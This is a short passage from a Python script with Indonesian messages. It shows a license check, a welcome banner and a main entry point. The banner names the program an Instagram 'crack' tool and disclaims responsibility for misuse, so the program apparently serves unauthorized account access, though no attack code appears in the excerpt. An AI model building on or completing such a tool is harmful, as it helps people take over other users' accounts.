        sol().print(wel2)
        time.sleep(2)
        lisensiku.append("sukses")
        selamat()
    else:
        tlisensi()

def selamat():
    print("")
    prints(Panel(f"[•]Selamat Datang Di Tools Crack Ig Premium\n[•]Gunakan Tools Ini Sewajar Nya Dan\nDan Gunakan Dengan Bijak\n[•]Bila Tidak Di Gunakan Dengan Bijak Bukan Tanggung Jawab Kami\n[•]SELAMAT BERSENANG SENANG"))
    input('');ANJIM()
    
if __name__=='__main__':
    try:
    	ANJIM()
    except requests.exceptions.ConnectionError:
        exit(f'\n[{M}!{C}] Koneksi internet bermasalah')
    folder()
